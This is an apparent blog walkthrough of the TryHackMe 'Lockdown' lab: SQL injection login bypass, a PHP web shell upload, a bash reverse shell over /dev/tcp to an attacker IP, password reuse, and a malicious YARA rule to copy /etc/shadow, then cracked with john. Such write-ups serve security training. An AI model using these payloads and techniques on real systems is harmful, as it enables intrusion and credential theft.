<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Lockdown - THM | Infomation Security - Blog</title><meta name="description" content="SummaryWe will retain the intial access by abusing the SQL injection vulnerability to bypass authentication and upload a PHP reverse shell. Enumerating the t...
    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Jay Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/lockdown-thm/"><meta property="og:description" content="
    Blog"><meta property="og:title" content="Lockdown - THM
  "><link rel="canonical" href="https://jayngng.github.io/blog/lockdown-thm/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">whoami</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">Lockdown - THM</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> October 07, 2021</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i>&nbsp;Tags:&nbsp; | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//web">web</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//linux">linux</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//offensive">offensive</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 5 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h2 id="summary"><strong>Summary</strong></h2><p>We will retain the intial access by abusing the <code class="language-plaintext highlighter-rouge">SQL injection</code> vulnerability to bypass authentication and upload a PHP reverse shell. Enumerating the target system locally, we discover that <code class="language-plaintext highlighter-rouge">cyrus</code> user reuses the password stored in a config file, which we will use to compromise <code class="language-plaintext highlighter-rouge">cyrus</code> shell access. Finally, privilege escalation can be achieved via injecting <code class="language-plaintext highlighter-rouge">clamscan</code>’s rules.</p><hr><h2 id="exploitation"><strong>Exploitation</strong></h2><h4 id="sql-injection"><strong>SQL Injection</strong></h4><p>Navigate to the <code class="language-plaintext highlighter-rouge">admin</code> page at <code class="language-plaintext highlighter-rouge">http://contacttracer.thm/admin/login.php</code>, we are prompted to login.</p><p>Trying some basic credentials: <code class="language-plaintext highlighter-rouge">admin:admin</code>, <code class="language-plaintext highlighter-rouge">root:toor</code>, and <code class="language-plaintext highlighter-rouge">admin:password</code> but none of them works out, we come up with an idea of using <code class="language-plaintext highlighter-rouge">sql injection</code> …</p><ul><li>Payload: <code class="language-plaintext highlighter-rouge">1' or 1=1-- -</code>, then <code class="language-plaintext highlighter-rouge">Sign In</code>.</li></ul><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/lockdown/1.png" title="lockdown/1.png" alt="lockdown/1.png"></div><p>And we successfully bypassed the authentication prompt!.</p><p>(More information about the vulnerability can be found <a href="https://packetstormsecurity.com/files/164005/COVID-19-Contact-Tracing-System-With-QR-Code-Scanning-1.0-SQL-Injection.html">here</a>.)</p><p>After landing on the <code class="language-plaintext highlighter-rouge">Admin Panel</code>, we then navigate to the following URL: <code class="language-plaintext highlighter-rouge">http://contacttracer.thm/admin/?page=system_info</code>.</p><h4 id="php-shell-upload"><strong>PHP Shell Upload</strong></h4><p>Now we prepare a <code class="language-plaintext highlighter-rouge">cmback.php</code> file with the following contents:</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">];</span> <span class="cp">?&gt;</span>
</code></pre></div></div><p>After the file is ready, we upload it onto the target server (<code class="language-plaintext highlighter-rouge">?page=system_info</code>) → click on <code class="language-plaintext highlighter-rouge">Update</code> …</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/lockdown/2.png" title="lockdown/2.png" alt="lockdown/2.png"></div><p>Intercept the traffic with <code class="language-plaintext highlighter-rouge">Burp</code> → modify the file type as below.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/lockdown/3.png" title="lockdown/3.png" alt="lockdown/3.png"></div><p>then <code class="language-plaintext highlighter-rouge">Forward</code> the traffic.</p><p>Once the file is successfully uploaded, we logout and go to the URL: <code class="language-plaintext highlighter-rouge">http://contacttracer.thm/login.php</code>.</p><p>Open web developer tool (<code class="language-plaintext highlighter-rouge">Ctrl + Shift + I</code>) → <code class="language-plaintext highlighter-rouge">Network</code> tab → we should see the <em>location of the PHP file we have uploaded</em>.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/lockdown/4.png" title="lockdown/4.png" alt="lockdown/4.png"></div><p>Let us try to trigger the shell with <code class="language-plaintext highlighter-rouge">curl</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> http://contacttracer.thm/uploads/1633297860_test.png.php<span class="se">\?</span><span class="nv">cmd</span><span class="o">=</span><span class="nb">whoami</span> <span class="nt">--output</span> -                                                                                              23 ⨯
PNG

IHDPN   pHYs

            tIME<span class="o">(</span>e<span class="se">\t</span>EXtCommentCreated with The GIMPd%eIDATxKL]@܌DF.F&amp;<span class="k">*</span>B1ոQ<span class="s2">"</span><span class="sb">`</span>+BJ
www-data
</code></pre></div></div><p>and we have code execution!.</p><p>Now, it is easy to pull a <code class="language-plaintext highlighter-rouge">bash</code> reverse shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> http://contacttracer.thm/uploads/1633297860_test.png.php<span class="se">\?</span><span class="nv">cmd</span><span class="o">=</span>bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.4.1.61%2F80+0%3E%261%22

<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 80                     
listening on <span class="o">[</span>any] 80 ...
connect to <span class="o">[</span>10.4.1.61] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.139.26] 54572
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1046<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@lockdown:/var/www/html/uploads<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div><hr><h2 id="privilege-escalation"><strong>Privilege Escalation</strong></h2><h4 id="shell-as-cyrus"><strong>Shell as <code class="language-plaintext highlighter-rouge">cyrus</code></strong></h4><p>Enumerating the system divulges a plaintext password stored in a config file.</p><p>Combine the password with each system user, we discover <code class="language-plaintext highlighter-rouge">sweetpandemonium</code> let us in as <code class="language-plaintext highlighter-rouge">cyrus</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@lockdown:/var/www/html/uploads<span class="nv">$ </span>su cyrus
Password: sweetpandemonium
cyrus@lockdown:~<span class="nv">$ </span>
</code></pre></div></div><p>With <code class="language-plaintext highlighter-rouge">cyrus</code> shell, we can execute the following <code class="language-plaintext highlighter-rouge">sudo</code> command:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyrus@lockdown:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>cyrus: 
Matching Defaults entries <span class="k">for </span>cyrus on lockdown:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User cyrus may run the following commands on lockdown:
    <span class="o">(</span>root<span class="o">)</span> /opt/scan/scan.sh
</code></pre></div></div><h4 id="system-compromised"><strong>System compromised</strong></h4><p>After conducting a few investigations, we realized that the directory <code class="language-plaintext highlighter-rouge">/var/lib/clamav/</code> is world-writable, which is also where the rules for <code class="language-plaintext highlighter-rouge">clamav</code> are defined.</p><p>Our goal is writting a <code class="language-plaintext highlighter-rouge">YARA</code> rule to flag the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file as malicious, the file is then copied to the <code class="language-plaintext highlighter-rouge">/quarantine</code> directory and is only accessible by us.</p><p>To do that, we first prepare a <code class="language-plaintext highlighter-rouge">.yara</code> rule:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyrus@lockdown:~<span class="nv">$ </span><span class="nb">cat</span> /var/lib/clamav/root.yara 
rule root_txt
<span class="o">{</span>
        strings:
                <span class="nv">$a</span> <span class="o">=</span> <span class="s2">"www-data:*:"</span>
        condition:
                <span class="nv">$a</span>
<span class="o">}</span>
</code></pre></div></div><p>Basically, the rule will look for any file with the content <code class="language-plaintext highlighter-rouge">www-data:*:</code> and mark it as malicious.</p><p>Once we trigger the rule …</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyrus@lockdown:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/scan/scan.sh                                                        
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>cyrus: 
Enter path: /etc   
/etc/ld.so.cache: OK                        
/etc/manpath.config: OK
/etc/rsyslog.conf: OK
...
<span class="nt">-----------</span> SCAN SUMMARY <span class="nt">-----------</span>
Known viruses: 2
Engine version: 0.103.2
Scanned directories: 1
Scanned files: 83
Infected files: 4
Data scanned: 0.23 MB
Data <span class="nb">read</span>: 0.12 MB <span class="o">(</span>ratio 1.97:1<span class="o">)</span>
Time: 0.080 sec <span class="o">(</span>0 m 0 s<span class="o">)</span>
Start Date: 2021:10:04 01:04:25
End Date:   2021:10:04 01:04:25
</code></pre></div></div><p>the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file is copied to <code class="language-plaintext highlighter-rouge">~/quarantine/shadow</code>.</p><p>Here is the content of the <code class="language-plaintext highlighter-rouge">shadow</code> file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyrus@lockdown:~<span class="nv">$ </span><span class="nb">cat </span>quarantine/shadow
...
maxine:<span class="nv">$6$/</span>syu6s6/<span class="nv">$Z5j6C61vrwzvXmFsvMRzwNYHO71NSQgm</span>/z4cWQpDxMt3JEpT9FvnWm4Nuy.xE3xCQHzY3q9Q4lxXLJyR1mt320:18838:0:99999:7:::
...
</code></pre></div></div><p>We can crack the hash locally employed tools called <code class="language-plaintext highlighter-rouge">unshadow</code> &amp; <code class="language-plaintext highlighter-rouge">john</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>unshadow maxine_passwd maxine_shadow <span class="o">&gt;</span> maxine_pass 
<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt maxine_pass
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6$ </span><span class="o">[</span>SHA512 256/256 AVX2 4x]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 5000 <span class="k">for </span>all loaded hashes
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
tiarna           <span class="o">(</span>maxine<span class="o">)</span>
1g 0:00:00:17 DONE <span class="o">(</span>2021-10-03 21:10<span class="o">)</span> 0.05767g/s 4665p/s 4665c/s 4665C/s 070196..skyline123
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div><p>With the cracked password, we can access <code class="language-plaintext highlighter-rouge">maxine</code> shell and run any <code class="language-plaintext highlighter-rouge">sudo</code> command as <code class="language-plaintext highlighter-rouge">root</code>!.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyrus@lockdown:~<span class="nv">$ </span>su maxine
Password: tiarna
maxine@lockdown:/home/cyrus<span class="nv">$ </span><span class="nb">sudo </span>su -
root@lockdown:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security © 2021-2022 • All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with&nbsp;<a href="https://jekyllrb.com" target="_blank">Jekyll</a>&nbsp;using&nbsp;<a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a>&nbsp;Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>